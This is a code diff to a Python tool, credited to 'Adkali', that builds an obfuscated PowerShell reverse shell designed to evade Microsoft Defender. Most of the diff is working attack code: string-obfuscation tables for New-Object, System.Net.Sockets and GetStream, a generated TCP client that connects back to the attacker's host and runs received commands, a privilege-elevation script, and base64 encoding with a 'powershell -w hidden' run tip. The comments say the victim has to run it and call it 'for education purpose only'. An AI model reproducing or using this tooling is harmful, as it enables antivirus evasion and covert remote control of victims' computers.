@@ -1,30 +1,39 @@
 import random
 import time
 import base64
-import os
 import argparse
+import logging
+import subprocess
+from tqdm import tqdm
+from colorama import init, Fore
+init(autoreset=True)
 
-# ---------------------------------------------------
-#                                                    #
-# AN OBFUSCATE PAYLOAD FOR BYPASS MICROSOFT DEFENDER #
-# OPEN A LISTENER ON ANY PORT [nc -lvnp 1234.]       #
-# MAKE SURE VICTIM RUNS IT, AND WAIT FOR A SHELL.    #
-#                                                    #
-# ---------------------------------------------------
+# - This tool is an obfuscated PowerShell payload designed to bypass RTP
+# - and allow for RCE on a victim's machine. It opens a listener on a specified
+# - port and waits for the victim to run it. The payload is created by replacing specific strings
+# - with randomly generated similar-looking strings to avoid detection
+# - The tool also provides a base64-encoded version of the payload that can be copied and run on the victim's machine.
+# - The tool's use requires knowledge of PowerShell and the ability to execute commands on the victim's machine.
+# - Made by Adkali
+# - For education purpose only
 
+# SET THE BASIC CONFING FOR LOGGING
+logging.basicConfig(level=logging.INFO)
+# CREATE A LOGGER WITH __NAME__ FOR THE CURRENT MODULE
+logger = logging.getLogger(__name__)
 
 # ---------------------  DEFINING COLORS ---------------------
+def Pro_Colors():
+    yellow = Fore.YELLOW
+    red = Fore.RED
+    normal = Fore.RESET
+    cyan = Fore.CYAN
+    lightblue = Fore.LIGHTBLUE_EX
+    green = Fore.GREEN
+    return yellow, red, normal, cyan, lightblue, green
 
-Yellow = "\033[1;33;40m"
-Red = "\033[1;31;40m"
-Normal = "\033[0;0m"
-l_cyan = '\033[96m'
-Pink = '\033[95m'
-
-def Code_Colors():
-    global Yellow, Red, Normal, l_cyan, Pink
-
-Code_Colors()
+# Assign Colors To Names, Call Them After.
+Yellow, Red, Normal, l_cyan, LightBlue, Green = Pro_Colors()
 
 MAIN = "├──"
 TEE2 = "└──"
@@ -42,40 +51,46 @@ def JOKER():
 
 
 # -------------- USING PARSER LIBRARY --------------
-
 parser = argparse.ArgumentParser(description="Why so serious?")
 parser.add_argument('-l', '-local', type=str, required=True, help='Local Machine')
-parser.add_argument('-p', '-port', type=int, required=True, help='On What Port To Connect')
+parser.add_argument('-p', '-port', type=int, default=None, help='On What Port To Connect')
+parser.add_argument('-r', '-raw', choices=["raw"], required=False, help="Raw Output")
 args = parser.parse_args()
 
+if not args.p:
+    print(f"\n[!] {Fore.RED}\033[1mNote:{Fore.RESET} Default port is 4444.")
+    args.p = 4444
+time.sleep(0.5)
+
+# Words To Check For
 def Bomb():
     try:
-        print(f"\n{Red}{MAIN}{Normal} Calculating Strings...")
+        logger.info(f"\n{Red}{MAIN}{Normal} Calculating Strings...")
         with open('Payload.ps1', 'r') as file:
             spl = file.read()
-            time.sleep(1.5)
-            print(f"{SPACE_PREFIX}{Yellow}{TEE2}{Normal}Checking Randomly {len(spl)} Strings....")
-            time.sleep(1.5)
-            if "SYSTEMROOT" and "New-Object" and "GetStream" and "ASCII" and "System.Net.Sockets" not in spl:
-                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}SYSTEMROOT - Replaced")
-                time.sleep(1)
-                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}New-Object - Replaced")
-                time.sleep(1)
-                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}GetStream - Replaced")
-                time.sleep(1)
-                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}System.Net.Sockets - Replaced")
-                time.sleep(1)
-                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}{Pink}{Normal}Finishing it all...")
-                time.sleep(1.5)
-                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{SPACE_PREFIX}{l_cyan}{TEE2}{Normal}Payload Generated...... ↓\n")
-                time.sleep(1.5)
+            words_to_check = ["SYSTEMROOT", "New-Object", "GetStream", "ASCII", "System.Net.Sockets", "$client", "$sendback"]
+            word_to_update = [repl, repl3, repl5, repl6, repl4, repl7, repl8]
+            num_words_to_check = len(words_to_check)
+            time.sleep(1)
+            print(f"{SPACE_PREFIX}{Yellow}{TEE2}{Normal}Checks For Replaceable Words....")
+            time.sleep(0.5)
+            with tqdm(total=num_words_to_check, bar_format="{l_bar}{bar}{r_bar}", colour='YELLOW') as pbar:
+                for i, word in enumerate(words_to_check):
+                    pbar.update(1)
+                    time.sleep(0.001)
+                    if word not in spl:
+                        pbar.write(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}{i+1}. {word} - {Yellow}Replaced{Normal} -->> {word_to_update[i]}")
+                    time.sleep(1)
+        print(f"{SPACE_PREFIX}{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}{LightBlue}{Normal}Just A Second...")
+        time.sleep(1.5)
+        print(f"{SPACE_PREFIX}{SPACE_PREFIX}{SPACE_PREFIX}{l_cyan}{TEE2}{Normal}Payload Generated...... ↓\n")
+        time.sleep(1.5)
 
     except Exception as e:
-        print(e)
+        logger.error(e)
 
 
 # ------------ DMV GDE PDE GTG --------------------
-
 Command1 = ['$a = IEX $env:', 'SystemRoot\SysWow64\??ndowsPowerShe??', '\\v1.0\powershe??.exe;']
 Command2 = ['$client = New-Object ', 'System.Net.Sockets.', 'TCPClient("0.0.0.0",0000)']
 Command3 = ['$stream = ', '$client.GetStream();', '[byte[]]$bytes = 0..65535|%{0};']
@@ -84,7 +99,6 @@ Command4 = ['while(($i = $stream.Read($bytes, 0, $bytes.Length))',
 Command5 = ['$data = (New-Object -TypeName System.Text.ASCIIEncoding)', '.GetString($bytes,0, $i);']
 
 # --------------------- WORDS TO GET-OFF --------------------- #
-
 # S//Y//S//T//E//M//R//O//O//T
 WordCharSystem1 = ["SysTemROot", "Syste?????", "Syst??r??t", "SyS?em?oo?"
                    "SYSTEmRoot", "Sys???r???"
@@ -96,7 +110,8 @@ WordCharSystem2 = ["SysWoW??", "SYSW?W6?", "SySwO???", "SYSW????"
 
 # N//e//w//O//b//j//e//c//t
 WordCharSystem3 = ["Ne''w-O''bje''ct", "N''ew-O''bj''ec''t", "N'e'W'-'o'B'J'e'C'T'",
-                   "New-ObJeCt", "NeW-oBJeCT", "&('New'+'-ObJect')", "&('N'+'e'+'w'+'-ObJect')",
+                   "&('N'+'e'+'w'+'-'+'O'+'b'+'J'+'e'+'c'+'t')", "NeW-oB''JeCT", "&('New'+'-ObJect')",
+                   "&('N'+'e'+'w'+'-ObJect')", "&('New'+'-'+'Ob'+'je'+'ct')", "&('Ne+'w'+'-'+'Ob'+'je'+'ct')"
                    ]
 
 # S//y//s//t//e//m//.//N//e//t//.//S//o//c//k//e//t//s
@@ -111,18 +126,19 @@ WordCharSystem5 = ["('Get'+'St'+'r'+'eam')", "('Get'+'Stream')", "('G'+'e'+'T'+'
                    ]
 
 # S//y//s//t//e//m//T//e//x//t//.//A//S//C//I//I//E//n//c//o//d//i//n//g
-WordCharSystem6 = ["Sys''t''em.Te''xt.AS''CI''IEn''co''ding", "Sy''Ste''M.tExT.A''SCi''iEN''coding"
+WordCharSystem6 = ["Sys''t''em.Te''xt.AS''CI''IEn''co''ding", "Sy''Ste''M.tExT.A''SCi''iEN''coding",
+                   "S'y's't'e'm.T'e'x't.'A'S'C'I'IE'n'c'o'd'i'n'g"
                    ]
 
-WordCharSystem7 = ["$41b394758330c83757856aa482c79977", "$37f91a10810c37a0f946c88eecf0bb86",
-                   "$bc95dfc14146aa23e43f2ea7af04d310", "$e7fcf8e49e39af3c66af246fdcf535df"
+WordCharSystem7 = ["$41b394758330c8=$3757856aa482c79977", "$37f=$91a10810c37a0f=$946c88e=$ecf0bb86",
+                   "$b=$c=$9=$5=$d=$f=$c=$1=$4=$1=$4=$6=$a=$a=$2=$3=$e=$4=$3=$f=$2=$e=$a=$7=$a=$f=$0=$4=$d=$3=$1=$0",
+                   "$e=$7=$f=$c=$f=$8=$e=$4=$9=$e=$3=$9=$a=$f=$3=$c=$f=$6=$a=$f=$2=$4=$6=$f=$d=$c=$f=$5=$3=$5=$d=$f",
                    ]
 
 WordCharSystem8 = ["$3dbfe2ebffe072727949d7cecc51573b", "$b15ff490cfd2aa65358d2e5e376c5dd2",
                    "$b91ae5f2a05e87e53ef4ca58305c600f", "$fb3c97733989bd69eede22507aab10df"
                    ]
 # --------------------- Join List Together --------------------- #
-
 C1 = ''.join(Command1).strip()
 C2 = ''.join(Command2).strip()
 C3 = ''.join(Command3).strip()
@@ -133,7 +149,6 @@ W2 = ', '.join(WordCharSystem2)
 w3 = '. '.join(WordCharSystem3)
 
 # --------------------- REPLACING --------------------- #
-
 if "SYSTEMROOT" or "SystemRoot" in C1:
     repl = random.choice(WordCharSystem1)
 if "SysWow64" in C1:
@@ -148,7 +163,6 @@ if "System.Text.ASCIIEncoding" in C4:
     repl6 = random.choice(WordCharSystem6)
 
 # --------------------- MAIN CODE ---------------------
-
 privilege = '''
 param([switch]$Elevated)
 
@@ -174,8 +188,6 @@ Invoke-Expression $decodedCommand
 '''
 
 # --------------------- CONTINUE MAIN CODE BLOCK ---------------------
-
-
 def Execute_privilege():
     with open('Privilege.ps1', 'w') as run:
         run.write(f'{privilege}')
@@ -183,16 +195,21 @@ def Execute_privilege():
 
 def Execute_Payload():
     with open('Payload.ps1', 'w') as run2:
-        run2.write(f"$client = {repl3} {repl4}('{args.l}',{args.p});\n")
+        run2.write(f";$client = {repl3} {repl4}('{args.l}',{args.p});\n")
         run2.write(f"$StReAm = $client.{repl5}();[byte[]]$bytes = 0..65535|%" + "{0};\n")
-        run2.write(f"while(($i = $StREaM.ReAd($bytes, 0, $byteS.LeNgTh)) -ne 0)" + "{;\n")
-        run2.write(f"$data = (New-Object -TypENAme " + f"{repl6}).('Ge'+'tStRinG')($bytes,0, $i);\n")
-        run2.write('''$sendback = (iex ". { $DATA } 2>&1" | Ou''t-Str''ing ); $blabla2 = ${sendback} + 'JokerShell ' + (pwd).Path + '> ';\n''')
-        run2.write("$sendbyte = ([text.encoding]::ASCII).GetBYTeS($blabla2);$stREaM.Write($sendbyte,0,$seNdByte.Length);$sTREaM.Flush()};$client.Close()\n")
+        run2.write(f"while(($i = $StREaM.ReAd($bytes, 0, $bytes.LeNgTh)) -ne 0)" + "{;\n")
+        run2.write(f"$data = ({repl3} -TypENAme " + f"{repl6}).('Ge'+'tStRinG')($bytes,0, $i);\n")
+        run2.write(f'''$sendback = (iex ". {{  $DATA  }} 2>&1" | Ou''t-Str''ing );\n''')
+        run2.write(f"$J=$O=$K=$E=$R=$P=$W=$R = ${{sendback}} + '{LightBlue}JokerShell{Normal} ' + (pwd).Path + '> ';\n")
+        run2.write("$s = ('{0}{1}{2}{3}'-f 't','e','x','t'); $sendbyte = ([text.encoding]::ASCii).GetBYTeS($R);\n")
+        run2.write("$stREaM.Write($sendbyte,0,$seNdByte.Length);$sTREaM.Flush()};$client.Close()\n")
     run2.close()
     time.sleep(1)
 
+repl7 = None
+repl8 = None
 def Change_Payload(x):
+    global repl7, repl8
     # Make Random MD5 Value Variables
     repl7 = random.choice(WordCharSystem7)
     repl8 = random.choice(WordCharSystem8)
@@ -202,10 +219,14 @@ def Change_Payload(x):
     new_content = file_content.replace("$client", repl7)
     new_content2 = new_content.replace("$sendback", repl8)
     new_content3 = new_content2.replace("sendback", repl8.split("$")[1])
-
     with open(x, 'w') as run4:
         run4.write(new_content3)
     run3.close()
+
+def Raw_Payload(x):
+    with open(x, "r") as f:
+        file = f.read()
+        print(file)
 
 # -------------------------------- ENCODE TO BASE64 WHEN FINISH ------------------------------#
  #                                                                                             #
@@ -228,9 +249,14 @@ def main():
     time.sleep(0.5)
     print(f"[+] {Yellow}TIP{Normal}: use as: powershell -w hidden -EncodedCommand [PAYLOAD]")
     print("PAYLOAD -> Copy and run:\n")
-    os.system('iconv -f ASCII -t UTF-16LE Payload.ps1 | base64 -w 0')
+    base64_payload = subprocess.Popen('iconv -f ASCII -t UTF-16LE Payload.ps1 | base64 -w 0', shell=True, stdout=subprocess.PIPE)
+    base_bytes = base64_payload.communicate()[0]
+    if args.r == "raw":
+        Raw_Payload(x=FP)
+    else:
+        print(f"powershell -e {base_bytes.decode('utf-8')}")
     time.sleep(0.5)
-    os.system("rm -r Payload.ps1")
+    subprocess.Popen('rm -r Payload.ps1', shell=True)
 
 if __name__ == '__main__':
     main()
